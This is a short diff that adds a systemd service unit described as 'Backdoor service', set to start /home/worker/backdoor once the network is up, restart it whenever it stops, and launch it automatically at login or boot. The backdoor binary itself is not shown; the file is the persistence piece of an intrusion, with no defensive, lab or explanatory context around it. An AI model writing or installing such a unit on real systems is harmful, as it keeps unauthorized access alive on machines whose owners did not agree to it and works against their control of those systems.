@@ -1,0 +1,13 @@
+[Unit]
+Description=Backdoor service
+Wants=network-online.target
+After=network-online.target
+
+[Service]
+Type=simple
+Restart=always
+TimeoutStopSec=70
+ExecStart=/home/worker/backdoor
+
+[Install]
+WantedBy=default.target
